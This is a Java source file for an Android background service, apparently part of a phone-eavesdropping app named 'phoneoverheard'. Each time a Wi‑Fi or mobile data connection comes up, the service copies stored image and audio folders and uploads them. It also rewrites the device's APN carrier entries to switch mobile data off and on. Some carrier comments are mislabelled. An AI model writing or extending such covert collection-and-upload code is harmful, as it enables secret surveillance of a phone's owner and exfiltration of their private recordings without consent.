package com.phoneoverheard.phonne;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import com.phoneoverheard.database.Manager;
import com.phoneoverheard.database.ManagerService;

import android.annotation.SuppressLint;
import android.app.Service;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

@SuppressLint("SimpleDateFormat")
public class NetworkService extends Service {

    private static final String TAG = "NetworkService"; 
    private static int ConnectState;
    Uri uri = Uri.parse("content://telephony/carriers");
	Date date = new Date(System.currentTimeMillis());
	SimpleDateFormat Dateformat = new SimpleDateFormat("yyyyMMddHHmmss");
	final String receiveTime = Dateformat.format(date);
	WriteLog mylog = new WriteLog();
	
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}
    
    @Override  
    public void onCreate() { 
    	Log.i(TAG, "onCreate called.");  
    	mylog.WrLog("i",TAG,"监听手机网络状态（包括GPRS，WIFI， UMTS等");
        super.onCreate(); 
        //监听手机网络状态（包括GPRS，WIFI， UMTS等
		TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
		telephonyManager.listen(new ConnectionStateListener(), PhoneStateListener.LISTEN_DATA_CONNECTION_STATE);
		//ConnectivityManager connManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
    }
	
    @Override  
    public int onStartCommand(Intent intent, int flags, int startId) {  
        Log.i(TAG, "onStartCommand called.");  
        return super.onStartCommand(intent, flags, startId);  
    }  
    
    @Override  
    public void onStart(Intent intent, int startId) {   
        Log.i(TAG, "onStart called.");  
    }  
	
    @Override
    public void onDestroy() { 
        Log.i(TAG, "onDestroy called.");  
        super.stopSelf();
        super.onDestroy();  
    }  
    
    /**
     * 当手机网络状态发生变化执行
     * @param 无
     * @return 无
     */
	private class ConnectionStateListener extends PhoneStateListener{
		@SuppressWarnings("unused")
		private String incomingNumber;		
		@SuppressLint("SimpleDateFormat")
		@Override
		public void onDataConnectionStateChanged(int state) { 
			switch(state){
				case TelephonyManager.DATA_DISCONNECTED: //网络断开 
					Log.i(TAG, "网络状态："+state+"网络断开 ");
					mylog.WrLog("i",TAG,"网络状态："+state+"网络断开 ");
					break; 
				case TelephonyManager.DATA_CONNECTING:   //网络正在连接 
					Log.i(TAG, "网络状态："+state+"网络正在连接  ");
					mylog.WrLog("i",TAG,"网络状态："+state+"网络正在连接  ");
					break; 
				case TelephonyManager.DATA_CONNECTED:    //网络连接上 
					ConnectState = getConnectedType(getBaseContext());
					if(ConnectState == ConnectivityManager.TYPE_WIFI){
						Log.i(TAG, "网络状态："+state+"网络已连接，已连接网络类型："+ConnectState+" wifi网络");
						mylog.WrLog("i",TAG,"网络状态："+state+"网络已连接，已连接网络类型："+ConnectState+" wifi网络");
				    	ManagerService managerservice = new ManagerService(getBaseContext());
				    	Manager manager = managerservice.find("manager");
				    	String oldPath = manager.getImgfolder();
				    	String newPath = manager.getAudiofolder();
				    	FileService fileservice = new FileService();
				    	fileservice.copyFolder(oldPath, newPath, getBaseContext());
				    	fileservice.uploadFolder(newPath,getBaseContext());
					}else if(ConnectState == ConnectivityManager.TYPE_MOBILE){
						Log.i(TAG, "网络状态："+state+"网络已连接，已连接网络类型："+ConnectState+" 手机网络");
						mylog.WrLog("i",TAG,"网络状态："+state+"网络已连接，已连接网络类型："+ConnectState+" 手机网络");
				    	ManagerService managerservice = new ManagerService(getBaseContext());
				    	Manager manager = managerservice.find("manager");
				    	String oldPath = manager.getImgfolder();
				    	String newPath = manager.getAudiofolder();
				    	FileService fileservice = new FileService();
				    	fileservice.copyFolder(oldPath, newPath, getBaseContext());
				    	fileservice.uploadFolder(newPath,getBaseContext());
					}
					break; 
			} 
		} 	
	}
    
    /**
     * 判断是否有网络连接
     * @param context
     * @return boolean
     */
    public boolean isNetworkConnected(Context context) { 
    	if (context != null) { 
	    	ConnectivityManager mConnectivityManager = (ConnectivityManager) context 
	    	.getSystemService(Context.CONNECTIVITY_SERVICE); 
	    	NetworkInfo mNetworkInfo = mConnectivityManager.getActiveNetworkInfo(); 
	    	if (mNetworkInfo != null) { 
	    		return mNetworkInfo.isAvailable(); 
	    	} 
    	} 
    	return false; 
    }
    
    /**
     * 判断WIFI网络是否可用
     * @param context
     * @return boolean
     */
    public boolean isWifiConnected(Context context) { 
    	if (context != null) { 
	    	ConnectivityManager mConnectivityManager = (ConnectivityManager) context 
	    	.getSystemService(Context.CONNECTIVITY_SERVICE); 
	    	NetworkInfo mWiFiNetworkInfo = mConnectivityManager 
	    	.getNetworkInfo(ConnectivityManager.TYPE_WIFI); 
	    	if (mWiFiNetworkInfo != null) { 
	    		return mWiFiNetworkInfo.isAvailable(); 
	    	} 
    	} 
    	return false; 
    } 
    
    /**
     * 判断MOBILE网络是否可用
     * @param context
     * @return boolean
     */
    public boolean isMobileConnected(Context context) { 
    	if (context != null) { 
	    	ConnectivityManager mConnectivityManager = (ConnectivityManager) context 
	    	.getSystemService(Context.CONNECTIVITY_SERVICE); 
	    	NetworkInfo mMobileNetworkInfo = mConnectivityManager 
	    	.getNetworkInfo(ConnectivityManager.TYPE_MOBILE); 
	    	if (mMobileNetworkInfo != null) { 
	    		return mMobileNetworkInfo.isAvailable(); 
	    	} 
    	} 
    	return false; 
    } 

    /**
     * 获取当前网络连接的类型信息
     * @param context
     * @return boolean
     */
    public static int getConnectedType(Context context) { 
	    if (context != null) { 
	    	ConnectivityManager mConnectivityManager = (ConnectivityManager) context 
	    	.getSystemService(Context.CONNECTIVITY_SERVICE); 
	    	NetworkInfo mNetworkInfo = mConnectivityManager.getActiveNetworkInfo(); 
	    	if (mNetworkInfo != null && mNetworkInfo.isAvailable()) { 
	    		return mNetworkInfo.getType(); 
	    	} 
    	} 
    	return -1; 
    } 
    
    
    
    
    
    
    
    /**
     * 定义APN
     * @param 无
     * @return 无
     */
    public static class APN {
    	  String id;
    	  String apn;
    	  String type;
    }
    
    /**
     * 打开APN
     * @param 无
     * @return 无
     */
    @SuppressWarnings("rawtypes")
	public void openAPN() {
    	List apnlist = getAPNList();
		for (int i = 0; i < apnlist.size(); i++) {
			APN apn = (APN) apnlist.get(i); 
    	    ContentValues cv = new ContentValues();
    	    cv.put("apn", APNMatchTools.matchAPN(apn.apn));
    	    cv.put("type", APNMatchTools.matchAPN(apn.type));
    	    getContentResolver().update(uri, cv, "_id=?",
    	    new String[] { apn.id });
    	}
    }
    
    /**
     * 关闭APN
     * @param 无
     * @return 无
     */
    @SuppressWarnings("rawtypes")
	public void closeAPN() {
    	List apnlist = getAPNList();
    	for (int i = 0; i < apnlist.size(); i++) {
    		APN apn = (APN) apnlist.get(i); 
    		ContentValues cv = new ContentValues();
    		cv.put("apn", APNMatchTools.matchAPN(apn.apn) + "mdev");
    		cv.put("type", APNMatchTools.matchAPN(apn.type) + "mdev");
    		getContentResolver().update(uri, cv, "_id=?",
    		new String[] { apn.id });
    	}
    }
    
    /**
     * 获取APN列表
     * @param 无
     * @return 无
     */
    @SuppressWarnings({ "rawtypes", "unchecked" })
	private List getAPNList() {
    	String tag = "Main.getAPNList()";
    	// current不为空表示可以使用的APN
    	String projection[] = { "_id,apn,type,current" };
    	//查询数据库
    	Cursor cr = this.getContentResolver().query(uri, projection, null,null, null);
    	List list = new ArrayList();
    	while (cr != null && cr.moveToNext()) {
    		Log.d(tag,
    		cr.getString(cr.getColumnIndex("_id")) + "  "
    		+ cr.getString(cr.getColumnIndex("apn")) + "  "
    		+ cr.getString(cr.getColumnIndex("type")) + "  "
    		+ cr.getString(cr.getColumnIndex("current")));
    		APN a = new APN();
    		a.id = cr.getString(cr.getColumnIndex("_id"));
    		a.apn = cr.getString(cr.getColumnIndex("apn"));
    		a.type = cr.getString(cr.getColumnIndex("type"));
    		list.add(a);
		}
		if (cr != null)
		    cr.close();
		return list;
    }
    
    /**
     * 建立网络类型查询字典
     * @param 无
     * @return 无
     */
    public static class APNMatchTools {
    	public static class APNNet {
    		public static String CTWAP = "ctwap";   //中国电信WAP设置
    		public static String CTNET = "ctnet";   //中国电信互联网设置
    		public static String CMWAP = "cmwap";   //中国联通WAP设置
    		public static String CMNET = "cmnet";   //中国联通因特网设置
    		public static String GWAP_3 = "3gwap";  //中国联通3GWAP设置 
    		public static String GNET_3 = "3gnet";  //中国联通3G因特网设置
    		public static String UNIWAP = "uniwap"; //中国联通WAP设置
    		public static String UNINET = "uninet"; //中国联通因特网设置    
    		
    	}
    	
    	@SuppressLint("DefaultLocale")
		public static String matchAPN(String currentName) {
    		if ("".equals(currentName) || null == currentName) {
    			return "";
    		}
    		currentName = currentName.toLowerCase();
    		if (currentName.startsWith(APNNet.CMNET)){
    			return APNNet.CMNET;
    		}else if (currentName.startsWith(APNNet.CMWAP)){
    			return APNNet.CMWAP;
    		}else if (currentName.startsWith(APNNet.CTNET)){
    			return APNNet.CTNET;
    		}else if (currentName.startsWith(APNNet.CTWAP)){
    			return APNNet.CTWAP;
    		}else if (currentName.startsWith(APNNet.GNET_3)){
    			return APNNet.GNET_3;
    		}else if (currentName.startsWith(APNNet.GWAP_3)){
    			return APNNet.GWAP_3;
    		}else if (currentName.startsWith(APNNet.UNINET)){
    			return APNNet.UNINET;
    		}else if (currentName.startsWith(APNNet.UNIWAP)){
    			return APNNet.UNIWAP;
    		}else if (currentName.startsWith("default")){
    			return "default";
    		}else{
    			return "";
    		}
    	 }
    }
    
}
